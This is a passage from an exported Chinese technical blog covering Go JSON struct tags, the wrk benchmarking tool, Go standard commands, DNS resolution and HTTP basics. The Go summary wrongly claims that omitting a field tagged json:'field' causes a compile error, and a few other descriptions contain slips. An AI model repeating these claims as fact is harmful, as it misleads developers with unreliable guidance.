class="keyword">type</span> User <span class="keyword">struct</span> &#123;</span><br><span class="line">Id       <span class="keyword">string</span></span><br><span class="line">Name     <span class="keyword">string</span></span><br><span class="line">age      <span class="keyword">int</span></span><br><span class="line">gender   <span class="keyword">string</span></span><br><span class="line">nickname <span class="keyword">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> User2 <span class="keyword">struct</span> &#123;</span><br><span class="line">Id       <span class="keyword">string</span> <span class="string">`json:"id"`</span></span><br><span class="line">Name     <span class="keyword">string</span> <span class="string">`json:"name"`</span></span><br><span class="line">Age      <span class="keyword">int</span>    <span class="string">`json:"age"`</span></span><br><span class="line">Gender   <span class="keyword">string</span> <span class="string">`json:"gender"`</span></span><br><span class="line">NickName <span class="keyword">string</span> <span class="string">`json:"nickname"`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> User3 <span class="keyword">struct</span> &#123;</span><br><span class="line">Id       <span class="keyword">string</span> <span class="string">`json:"id"`</span></span><br><span class="line">Name     <span class="keyword">string</span> <span class="string">`json:"name,omitempty"`</span></span><br><span class="line">Age      <span class="keyword">int</span>    <span class="string">`json:"age,omitempty"`</span></span><br><span class="line">Gender   <span class="keyword">string</span> <span class="string">`json:"gender,omitempty"`</span></span><br><span class="line">NickName <span class="keyword">string</span> <span class="string">`json:"nickname,omitempty"`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> User4 <span class="keyword">struct</span> &#123;</span><br><span class="line">Id       <span class="keyword">string</span> <span class="string">`json:"id"`</span></span><br><span class="line">Name     <span class="keyword">string</span> <span class="string">`json:"name,omitempty"`</span></span><br><span class="line">Age      <span class="keyword">int</span>    <span class="string">`json:"-"`</span></span><br><span class="line">Gender   <span class="keyword">string</span> <span class="string">`json:"gender,omitempty"`</span></span><br><span class="line">NickName <span class="keyword">string</span> <span class="string">`json:"nickname,omitempty"`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">u := User&#123;</span><br><span class="line">Id:     <span class="string">"1"</span>,</span><br><span class="line">Name:   <span class="string">"张三"</span>,</span><br><span class="line">age:    <span class="number">20</span>,</span><br><span class="line">gender: <span class="string">"男"</span>,</span><br><span class="line">&#125;</span><br><span class="line">data, err := json.Marshal(u)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Println(err.Error())</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">u2 := User2&#123;</span><br><span class="line"><span class="string">"1"</span>,</span><br><span class="line"><span class="string">"张三"</span>,</span><br><span class="line"><span class="number">20</span>,</span><br><span class="line"><span class="string">"男"</span>,</span><br><span class="line"><span class="string">""</span>,</span><br><span class="line">&#125;</span><br><span class="line">data2, _ := json.Marshal(u2)</span><br><span class="line"></span><br><span class="line">u3 := User3&#123;</span><br><span class="line">Id: <span class="string">"1"</span>,</span><br><span class="line">&#125;</span><br><span class="line">data3, _ := json.Marshal(u3)</span><br><span class="line"></span><br><span class="line">u4 := User2&#123;</span><br><span class="line">Id: <span class="string">"1"</span>,</span><br><span class="line">&#125;</span><br><span class="line">data4, _ := json.Marshal(u4)</span><br><span class="line"></span><br><span class="line">u5 := User4&#123;</span><br><span class="line">Id:     <span class="string">"1"</span>,</span><br><span class="line">Name:   <span class="string">"张三"</span>,</span><br><span class="line">Age:    <span class="number">19</span>,</span><br><span class="line">Gender: <span class="string">"男"</span>,</span><br><span class="line">&#125;</span><br><span class="line">data5, _ := json.Marshal(u5)</span><br><span class="line">fmt.Printf(<span class="string">"%s ：只会打印出首字母大写的 field，首字母小写的 field 只允许在包内使用，没有使用 json 结构体标签，序列化之后的 json 数据，field 不会发生变化 \n"</span>, <span class="keyword">string</span>(data))</span><br><span class="line">fmt.Printf(<span class="string">"%s :使用 json 结构体标签，序列化之后的 json 数据，field 和 json 结构体保持一致 \n"</span>, <span class="keyword">string</span>(data2))</span><br><span class="line">fmt.Printf(<span class="string">"%s :使用 json 结构体标签，同时使用 omitempty 标记，初始化时，只有 Id 字段进行赋值 \n"</span>, <span class="keyword">string</span>(data3))</span><br><span class="line">fmt.Printf(<span class="string">"%s :使用 json 结构体标签，未使用 omitempty 标记，初始化时，只有 Id 字段进行赋值 \n"</span>, <span class="keyword">string</span>(data4))</span><br><span class="line">fmt.Printf(<span class="string">"%s :使用 json 结构体标签，同时使用 - 标记以及 omitempty 标记 \n"</span>, <span class="keyword">string</span>(data5))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行上面的示例代码，得到以下输出：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;"Id":"1","Name":"张三"&#125; ：只会打印出首字母大写的 field，首字母小写的 field 只允许在包内使用，没有使用 json 结构体标签，序列化之后的 json 数据，field 不会发生变化 </span><br><span class="line">&#123;"id":"1","name":"张三","age":20,"gender":"男","nickname":""&#125; :使用 json 结构体标签，序列化之后的 json 数据，field 和 json 结构体保持一致 </span><br><span class="line">&#123;"id":"1"&#125; :使用 json 结构体标签，同时使用 omitempty 标记，初始化时，只有 Id 字段进行赋值 </span><br><span class="line">&#123;"id":"1","name":"","age":0,"gender":"","nickname":""&#125; :使用 json 结构体标签，未使用 omitempty 标记，初始化时，只有 Id 字段进行赋值 </span><br><span class="line">&#123;"id":"1","name":"张三","gender":"男"&#125; :使用 json 结构体标签，同时使用 - 标记以及 omitempty 标记</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>json 结构体标签，用于结构体序列化时，将结构体与 json 数据解藕</li><li>定义为 <code>json:&quot;field&quot;</code> 格式的结构体，在初始化时，field 字段不能省略，否则会编译错误</li><li>定义为 <code>json:&quot;nickname,omitempty&quot;</code> 格式的结构体，在初始化时，field 字段可以省略。当省略 field 字段进行赋值时，序列化之后的 json 也不会包含该字段，反之则会包含</li><li>定义为 <code>json:&quot;-&quot;</code> 格式的结构体，初始化时，无论是否赋值，序列化之后的 json 都不会包含该字段</li></ul>]]></content>
      
      
      <categories>
          
          <category> Go </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Wrk 性能测试工具</title>
      <link href="/wrk-performance-testing-tool/"/>
      <url>/wrk-performance-testing-tool/</url>
      
        <content type="html"><![CDATA[<p>常用的性能测试工具，Apache ab 这个用得比较多的，这篇笔记用来介绍另外一个轻量级性能测试工具——<a href="https://github.com/wg/wrk" target="_blank" rel="noopener">wrk</a>。</p><a id="more"></a><blockquote><p>wrk 是一款针对 Http 协议的基准测试工具，它能够在单机多核 CPU 的条件下，使用系统自带的高性能 I/O 机制，如 epoll，kqueue 等，通过多线程和事件模式，对目标机器产生大量的负载——Github</p></blockquote><p>wrk 的优势：</p><ol><li>轻量级的性能测试工具，开箱即用</li><li>安装简单，各大操作系统基本上都能一键安装</li><li>学习成本很低，记住常用的几个参数即可</li><li>基于系统自带的高性能 I/O 机制，如 epoll, kqueue, 利用异步的事件驱动框架，通过很少的线程就可以压出很大的并发量</li></ol><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><h3 id="MacOS"><a href="#MacOS" class="headerlink" title="MacOS"></a>MacOS</h3><p>wrk 的安装非常简单：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ brew install wrk</span><br></pre></td></tr></table></figure><h3 id="Ubuntu"><a href="#Ubuntu" class="headerlink" title="Ubuntu"></a>Ubuntu</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get update</span><br><span class="line">$ sudo apt-get install wrk</span><br></pre></td></tr></table></figure><p>验证是否安装成功：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ wrk -v</span><br><span class="line">wrk 4.2.0 [kqueue] Copyright (C) 2012 Will Glozer</span><br></pre></td></tr></table></figure><h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p>wrk 命令格式如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ wrk &lt;options&gt; &lt;url&gt;</span><br></pre></td></tr></table></figure><p>其中常用参数如下：</p><ul><li>-c, –conections: 跟服务器建立并保持的 TCP 连接数量</li><li>-d, –duration: 压测时间，默认为 10s</li><li>-t, –threads: 使用多少个线程进行压测（线程数一般是核数的 2 到 4 倍，过多会出现线程切换过多导致效率降低）</li><li>-H: 指定请求的 HTTP Header，有些 API 需要传入一些 Header，可通过 Wrk 的 -H 参数来传入</li><li>–latency: 在压测结束之后，打印延迟统计信息</li><li>-T –timeout: 请求超时时间</li><li>-v，–version: 打印正在使用 wrk 详细版本信息</li><li>-s, –script: 指定 Lua 脚本路径</li></ul><h2 id="测试报告"><a href="#测试报告" class="headerlink" title="测试报告"></a>测试报告</h2><p>利用 wrk 对 <code>www.baidu.com</code> 发起压力测试，线程数为 4，模拟 300 个并发请求，持续 30 秒，并在压测结束之后，打印延迟统计信息。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20221202090629.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Mac </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Go 语言学习笔记——Go 标准命令学习</title>
      <link href="/go-language-study-notes-standard-command-learning/"/>
      <url>/go-language-study-notes-standard-command-learning/</url>
      
        <content type="html"><![CDATA[<p>Go 语言标准命令详解。</p><a id="more"></a><h2 id="go-env"><a href="#go-env" class="headerlink" title="go env"></a>go env</h2><p><code>go env</code> 是非常常用的命令，用于查看当前的 go 环境信息。</p><p>后面跟上环境变量名称，则可以输出对应环境变量的值：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ go env GOROOT</span><br><span class="line">/usr/<span class="built_in">local</span>/go</span><br></pre></td></tr></table></figure><blockquote><p>如果要修改某一个环境变量的值，那么该如何修改呢？</p></blockquote><p>不同的操作系统，修改的位置不同：</p><ul><li>Mac 和 Linux 是 <code>~/.bashrc</code> 或 <code>~/.bash_profile</code> 文件</li><li>如果使用了Zsh 那么就是 <code>~/.zshrc</code> 文件</li><li>Windows 则需要去系统设置里面的环境变量中修改</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 更新环境变量的值</span></span><br><span class="line"><span class="built_in">export</span> GOROOT=/usr/<span class="built_in">local</span>/go</span><br><span class="line"><span class="comment"># 加入环境变量中</span></span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:<span class="variable">$GOROOT</span>/bin</span><br></pre></td></tr></table></figure><p>添加以上内容到环境配置文件中，并保存，执行<code>source ~/.zshrc</code>命令刷新环境变量即可。</p><h2 id="go-build"><a href="#go-build" class="headerlink" title="go build"></a>go build</h2><p><code>go build</code> 也是非常常用的命令，用于对 Go 程序进行编译，命令格式如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ go build [-o output] [-i] [build flags] [packages]</span><br></pre></td></tr></table></figure><p>有两种情况：</p><ol><li>对于普通包（ 非 main 包）而言，只会执行编译检查, 不会产生任何文件</li><li>对于 main 包除了进行编译检查外，还会在当前目录下生成一个可执行文件</li></ol><p>如果当前目录下有多个文件，却只想编译某个文件，可以在命令后面指定文件名称：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ go build main.go</span><br></pre></td></tr></table></figure><p>Go提供了编译链工具，可以让我们在任何一个开发平台上，编译出其他平台的可执行文件。</p><p>默认情况下，都是根据当前的机器生成的可执行文件，如果需要在当前环境编译出其他操作系统的可执行文件，那么使用下面的命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ GOOS=linux GOARCH=amd64 go build bash</span><br></pre></td></tr></table></figure><p>GOOS 表示的是操作系统的名称，GOARCH 表示的是目标处理器的架构。</p><h2 id="go-run"><a href="#go-run" class="headerlink" title="go run"></a>go run</h2><p><code>go build</code> 命令是对程序进行编译，<code>go run</code> 则是对程序进行运行，相当于是把编译和执行二进制文件这两步，合并成了一步：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ go run hello.go</span><br><span class="line">hello world</span><br></pre></td></tr></table></figure><h2 id="go-install"><a href="#go-install" class="headerlink" title="go install"></a>go install</h2><p><code>go install</code> 和 <code>go build</code> 类似，不过它可以在编译后，会把生成的可执行文件或者库安装到对应的目录下，以供使用。</p><p>它的用法和 <code>go build</code> 差不多，如果不指定一个包名，就使用当前目录。安装的目录都是约定好的，如果生成的是可执行文件，那么安装在 <code>$GOPATH/bin</code> 目录下；如果是可引用的库，那么安装在 <code>$GOPATH/pkg</code> 目录下。</p><p>有时候一些第三方的依赖会提供一些命令行工具，这个时候就会用到 <code>go install</code> 命令进行安装了，例如安装 <a href="https://github.com/cosmtrek/air" target="_blank" rel="noopener">Air</a>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ GO111MODULE=on go install github.com/cosmtrek/air@latest</span><br></pre></td></tr></table></figure><h2 id="go-get"><a href="#go-get" class="headerlink" title="go get"></a>go get</h2><p><code>go get</code> 命令也是十分常用的，用于下载更新指定的包以及依赖的包，并对它们进行编译和安装。</p><p>如果需要更新某个依赖包，则加上 <code>-u</code> 参数：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ go get -u golang.org/x/sys</span><br></pre></td></tr></table></figure><p>下载下来的依赖包，全部在 <code>$GOPATH</code> 目录下。</p><h2 id="go-fmt"><a href="#go-fmt" class="headerlink" title="go fmt"></a>go fmt</h2><p><code>go fmt</code> 用于统一代码风格，<code>go fmt</code>会自动格式化代码文件并保存，它本质上其实是调用的 <code>gofmt -l -w</code> 这个命令。</p><p>使用 GoLand 进行开发时，每次编辑完一个文件，都会自动进行 <code>gofmt</code> 格式化。</p><h2 id="go-test"><a href="#go-test" class="headerlink" title="go test"></a>go test</h2><p><code>go test</code> 命令用于Go 的单元测试，它也是接受一个包名作为参数，如果没有指定，使用当前目录。 <code>go test</code> 运行的单元测试必须符合 Go 的测试要求。</p><ol><li>写有单元测试的文件名，必须以_test.go结尾。</li><li>测试文件要包含若干个测试函数。</li><li>这些测试函数要以Test为前缀，还要接收一个*testing.T类型的参数。</li></ol><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> test</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"log"</span></span><br><span class="line"><span class="string">"strings"</span></span><br><span class="line"><span class="string">"testing"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">TestName</span><span class="params">(t *testing.T)</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> <span class="string">"hello"</span> == strings.ToLower(<span class="string">"Hello"</span>) &#123;</span><br><span class="line">log.Println(<span class="string">"ok"</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这是一个单元测试，保存在 <code>default_test.go</code> 文件中。 如果要运行这个单元测试，在该文件目录下，执行 <code>go test default_test.go</code> 即可。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ go <span class="built_in">test</span> default_test.go </span><br><span class="line">ok      <span class="built_in">command</span>-line-arguments  0.083s</span><br></pre></td></tr></table></figure><h2 id="go-vet"><a href="#go-vet" class="headerlink" title="go vet"></a>go vet</h2><p><code>go vet</code> 命令用于检查代码中常见的错误，其中包括：</p><ol><li>Printf 这类的函数调用时，类型匹配了错误的参数。</li><li>定义常用的方法时，方法签名错误。</li><li>错误的结构标签。</li><li>没有指定字段名的结构字面量。</li></ol><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">"hello"</span>, <span class="string">"world"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这是一个很明显的错误例子，格式字符串中没有占位符，使用 <code>go vet</code> 命令就可以发现这个错误：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ go vet hello.go          </span><br><span class="line"><span class="comment"># command-line-arguments</span></span><br><span class="line">./hello.go:6:12: fmt.Printf call has arguments but no formatting directives</span><br></pre></td></tr></table></figure><p>使用 GoLand 进行开发时，对于这种类型的错误，编译器会给出一个警告。</p><h2 id="go-list"><a href="#go-list" class="headerlink" title="go list"></a>go list</h2><p><code>go list</code> 命令的作用是列出指定的代码包的信息。</p><p>查看当前包所使用的所有第三方依赖：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ go list -m all</span><br></pre></td></tr></table></figure><p><code>go list</code> 命令还有许多其他用法，通过 <code>go help list</code> 进行查看。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://doc.yonyoucloud.com/doc/wiki/project/go-command-tutorial/0.0.html" target="_blank" rel="noopener">标准命令详解</a></li><li><a href="https://go-zh.org/cmd/go/" target="_blank" rel="noopener">命令文档——Go</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Go </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络学习——05 相关协议</title>
      <link href="/computer-network-learning-05-related-agreements/"/>
      <url>/computer-network-learning-05-related-agreements/</url>
      
        <content type="html"><![CDATA[<p>跟 IP 协议相关的技术也不少，接下来说说与 IP 协议相关的􏰀要且常⻅的技术。</p><a id="more"></a><h2 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h2><p>IP 地址用于找到计算机，但是对于人类来说却是一个麻烦问题，因为很难记忆。</p><p>为了解决这一问题， 运营而生的便是 DNS 域名解析，DNS 可以将域名网址自动转换为具体的 IP 地址。</p><p>在一个完整的域名中，<strong>越靠右</strong>的位置表示其<strong>层级越高</strong>。 </p><p>比如 <code>server.com</code> 这个域名的层级关系：</p><ul><li>根 DNS 服务器</li><li>顶级域 DNS 服务器（com）</li><li>权威 DNS 服务器（server.com）</li></ul><p>根域的 DNS 服务器信息保存在互联网中所有的 DNS 服务器中。这样一来，任何 DNS 服务器就都可以找到并访问 根域 DNS 服务器了。</p><p>因此，客户端只要能够找到任意一台 DNS 服务器，就可以通过它找到根域 DNS 服务器，然后再一路顺藤摸瓜找到 位于下层的某台目标 DNS 服务器。</p><h2 id="DNS-域名解析过程"><a href="#DNS-域名解析过程" class="headerlink" title="DNS 域名解析过程"></a>DNS 域名解析过程</h2><p>浏览器首先看一下自己的缓存里有没有，如果没有就向操作系统的缓存要，还没有就检查本机域名解析文件 hosts，如果还是没有，就会 DNS 服务器进行查询，查询的过程如下：</p><ol><li>客户端首先会发出一个 DNS 请求，问 <code>www.server.com</code> 的 IP 是啥，并发给本地 DNS 服务器（也就是客户端的 TCP/IP 设置中填写的 DNS 服务器地址）。</li><li>本地域名服务器收到客户端的请求后，如果缓存里的表格能找到 <code>www.server.com</code>，则它直接返回 IP 地址。如果没有，本地 DNS 会去问它的根域名服务器：“老大， 能告诉我 <code>www.server.com</code> 的 IP 地址吗？” 根域名服务器是最高层次的，它不直接用于域名解析，但能指明一条道路。</li><li>根 DNS 收到来自本地 DNS 的请求后，发现后置是 .com，说：“<code>www.server.com</code> 这个域名归 .com 区域管理”，我给你 .com 顶级域名服务器地址给你，你去问问它吧。”</li><li>本地 DNS 收到顶级域名服务器的地址后，发起请求问“老二， 你能告诉我 <code>www.server.com</code> 的 IP 地址吗？”</li><li>顶级域名服务器说：“我给你负责 <code>www.server.com</code> 区域的权威 DNS 服务器的地址，你去问它应该能问到”。</li><li>本地 DNS 于是转向问权威 DNS 服务器：“老三，<code>www.server.com</code>对应的IP是啥呀？” server.com 的权威 DNS 服务器，它是域名解析结果的原出处。为啥叫权威呢？就是我的域名我做主。</li><li>权威 DNS 服务器查询后将对应的 IP 地址 <code>X.X.X.X</code> 告诉本地 DNS。</li><li>本地 DNS 再将 IP 地址返回客户端，客户端和目标建立连接。</li></ol><p>DNS 域名解析的过程蛮有意思的，整个过程就和我们日常生活中找人问路的过程类似，只指路不带路。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://xiaolincoding.com/network/" target="_blank" rel="noopener">图解网络——小林coding</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络学习——04 HTTP 篇</title>
      <link href="/computer-network-learning-04-http/"/>
      <url>/computer-network-learning-04-http/</url>
      
        <content type="html"><![CDATA[<p>计算机网络学习——04 HTTP 篇</p><a id="more"></a><h2 id="HTTP-基本概念"><a href="#HTTP-基本概念" class="headerlink" title="HTTP 基本概念"></a>HTTP 基本概念</h2><h3 id="HTTP-是什么"><a href="#HTTP-是什么" class="headerlink" title="HTTP 是什么"></a>HTTP 是什么</h3><p>HTTP 是超文本传输协议，也就是 HyperText Transfer Protocol。</p><h3 id="什么是超文本传输协议"><a href="#什么是超文本传输协议" class="headerlink" title="什么是超文本传输协议"></a>什么是超文本传输协议</h3><p>超文本传输协议可以拆成三个部分：</p><ul><li>超文本</li><li>传输</li><li>协议</li></ul><p><strong>1. 协议</strong><br>协议的概念是：必须有<strong>两个以上的参与者</strong>，同时对参与者的<strong>一种行为约定和规范</strong>。</p><p>针对 HTTP 协议，可以这么理解：<br>HTTP 是一个用在计算机世界里的<strong>协议</strong>。它使计算机能够理解的语言<strong>确立了一种计算机之间交流通信的规范</strong>（两个以上的参与者），以及相关的各种控制和错误处理方式（行为约定和规范）。</p><p><strong>2. 传输</strong><br> HTTP 是一个在计算机世界里专门用来在<strong>两点之间传输数据</strong>的约定和规范。</p><p><strong>3. 超文本</strong><br>超文本就是超越了普通的文本，它是文字、图片、视频等的混合体，最关键有超链接，能从一个超文本跳转到另外一个超文本。</p><p>对于超文本传输协议，下面这个解释更为准确：</p><p>HTTP 是一个在计算机世界里专⻔在「两点」之间「传输」文字、图片、音频、视频等「超文本」数据的「约定和规范」。</p><h3 id="HTTP-常见的状态码"><a href="#HTTP-常见的状态码" class="headerlink" title="HTTP 常见的状态码"></a>HTTP 常见的状态码</h3><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220928091756.png" alt=""><br><strong>1xx</strong></p><p>1xx 类状态码属于提示信息，是协议处理中的一种中间状态，实际用到的比较少。</p><p><strong>2xx</strong> </p><p>2xx 类状态码表示服务器成功处理了客户端的请求。</p><ul><li>「200 OK」是最常⻅的成功状态码，表示一切正常。如果是非 HEAD 请求，服务器返回的响应头都会有 body 数据。</li><li>「204 No Content」也是常⻅的成功状态码，与 200 OK 基本相同，但响应头没有 body 数据。</li><li>「206 Partial Content」是应用于 HTTP 分块下载或断点续传，表示响应返回的 body 数据并不是资源的全部，而 是其中的一部分，也是服务器处理成功的状态。</li></ul><p><strong>3xx</strong></p><p>3xx 类状态码表示客户端请求的资源发送了变动，需要客户端用新的 URL 重新发送请求获取资源，也就是重定向。</p><ul><li>「301 Moved Permanently」表示永久􏰂定向，说明请求的资源已经不存在了，需改用新的 URL 再次访问。</li><li>「302 Found」表示临时􏰂定向，说明请求的资源还在，但暂时需要用另一个 URL 来访问。</li><li>「304 Not Modified」不具有跳转的含义，表示资源未修改，重定向已存在的缓冲文件，也称缓存􏰂定向，用于缓存控制。</li></ul><p><strong>4xx</strong></p><p>4xx 类状态码表示客户端发送的报文有误，服务器无法处理，也就是错误码的含义。</p><ul><li>「400 Bad Request」表示客户端请求的报文有错误，但只是个笼统的错误。</li><li>「403 Forbidden」表示服务器禁止访问资源，并不是客户端的请求出错。</li><li>「404 Not Found」表示请求的资源在服务器上不存在或未找到，所以无法提供给客户端。</li></ul><p><strong>5xx</strong></p><p>5xx 类状态码表示客户端请求报文正确，但是服务器处理时内部发生了错误，属于服务器端的错误码。</p><ul><li>「500 Internal Server Error」与 400 类型，是个笼统通用的错误码，只知道服务器发生了错误，但是具体发生了什么错误，并不清楚。</li><li>「501 Not Implemented」表示客户端请求的功能还不支持，类似“即将开业，敬请期待”的意思。</li><li>「502 Bad Gateway」通常是服务器作为网关或代理时返回的错误码，表示服务器自身工作正常，WebService 发生了错误。</li><li>「503 Service Unavailable」表示服务器当前很忙，暂时无法响应服务器，类似“网络服务正忙，请稍后重试试”的意思。</li></ul><h3 id="常见的首部字段"><a href="#常见的首部字段" class="headerlink" title="常见的首部字段"></a>常见的首部字段</h3><table><thead><tr><th>首部字段</th><th>含义</th><th>示例值</th></tr></thead><tbody><tr><td>Host 字段</td><td>服务器的域名</td><td><a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a></td></tr><tr><td>Content-Length</td><td>服务器回应的数据⻓度（字节）</td><td>1357</td></tr><tr><td>Connection</td><td>客户端要求服务器使用 TCP 持久连接</td><td>keep-alive</td></tr><tr><td>Content-Type</td><td>服务器响应时，告诉客户端本次数据是什么格式以及编码</td><td>text/html; charset=utf-8</td></tr><tr><td>Content-Encoding</td><td>服务器返回的数据使用了什么压缩格式</td><td>gzip</td></tr></tbody></table><h2 id="HTTP-的工作原理"><a href="#HTTP-的工作原理" class="headerlink" title="HTTP 的工作原理"></a>HTTP 的工作原理</h2><h2 id="HTTP-的特性"><a href="#HTTP-的特性" class="headerlink" title="HTTP 的特性"></a>HTTP 的特性</h2><p>这里讨论的 HTTP，指的是 HTTP（1.1）。</p><p>HTTP 最凸出的优点是「简单、灵活和易于扩展、应用广泛和跨平台」。</p><p><strong>1. 简单</strong><br>HTTP 基本的报文格式就是 header + body ，头部信息也是 key-value 简单文本的形式，易于理解，降低了学 习和使用的⻔槛。</p><p><strong>2. 灵活和易于扩展</strong><br>HTTP协议里的各类请求方法、URI/URL、状态码、头字段等每个组成要求都没有被固定死，都允许开发人员自定义和扩充。</p><p><strong>3. 应用广泛和跨平台</strong><br>互联网发展至今，HTTP 的应用非常广泛，从台式机的浏览器到手机上的各种 APP，HTTP 的应用遍地开花，同时天然具有跨平台的优越性。</p><h2 id="HTTP-的优缺点"><a href="#HTTP-的优缺点" class="headerlink" title="HTTP 的优缺点"></a>HTTP 的优缺点</h2><p>HTTP 协议里有优缺点一体的双刃剑，分别是「无状态、明文传输」，同时还有一大缺点「不安全」。</p><h3 id="1-无状态"><a href="#1-无状态" class="headerlink" title="1. 无状态"></a>1. 无状态</h3><p>无状态的好处，因为服务器不会去记忆 HTTP 的状态，所以不需要额外的资源来记录状态信息，这能减轻服务器的负担，能够把更多的 CPU 和内存用来对外提供服务。</p><p>无状态的坏处也很明显，服务器没有“记忆能力”，没法知道用户的身份。</p><h3 id="2-明文传输"><a href="#2-明文传输" class="headerlink" title="2. 明文传输"></a>2. 明文传输</h3><p>明文意味着在传输过程中的信息，是可方便阅读的，通过浏览器的 F12 控制台或 Wireshark 抓包都可以直接肉眼查看，为我们调试工作带了极大的便利性。</p><p>但是这正是这样，HTTP 的所有信息都暴露在了光天化日下，相当于信息裸奔。在传输的漫⻓的过程中，信息的内 容都毫无隐私可言，很容易就能被窃取。</p><h3 id="3-不安全"><a href="#3-不安全" class="headerlink" title="3. 不安全"></a>3. 不安全</h3><p>HTTP 比较严重的缺点就是不安全：</p><ol><li>通信使用明文（不加密），内容可能会被窃听</li><li>不验证通信双方身份，因此可能遭遇伪装</li><li>无法证明报文的完整性，所以可能已遭篡改</li></ol><p>HTTP 的安全问题，可以用 HTTPS 的方式解决，也就是通过引入 SSL/TLS 层，使得在安全上达到了极致。</p><h2 id="HTTP-的性能"><a href="#HTTP-的性能" class="headerlink" title="HTTP 